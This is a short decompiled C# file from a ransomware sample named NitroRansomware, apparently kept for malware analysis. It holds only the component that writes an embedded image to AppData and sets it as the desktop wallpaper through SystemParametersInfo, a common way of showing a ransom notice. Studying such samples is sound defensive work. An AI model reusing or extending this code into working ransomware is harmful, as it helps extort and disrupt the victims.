// Decompiled with JetBrains decompiler
// Type: NitroRansomware.Wallpaper
// Assembly: NitroRansomware, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BE95CECD-0A68-4BA9-9E14-B4A1304BC79B
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan-Ransom.MSIL.Gen.gen-00a84b4d7c45a603efaf946f2422e8ce64ebb632473ec36c34c03a94739e745a.exe

using NitroRansomware.Properties;
using System;
using System.Runtime.InteropServices;

namespace NitroRansomware
{
  internal class Wallpaper
  {
    private static uint SPI_SETWALL = 20;
    private static uint SPIF_UPDATE = 1;
    private static uint SPIF_SWEDWINI = 2;
    private static string fileName;

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(
      uint uAction,
      int uParam,
      string lpvParam,
      uint fuWinIni);

    public static void ChangeWallpaper()
    {
      Wallpaper.fileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\wallpaper.png";
      Resources.wl.Save(Wallpaper.fileName);
      Wallpaper.SystemParametersInfo(Wallpaper.SPI_SETWALL, 0, Wallpaper.fileName, Wallpaper.SPIF_UPDATE | Wallpaper.SPIF_SWEDWINI);
    }
  }
}
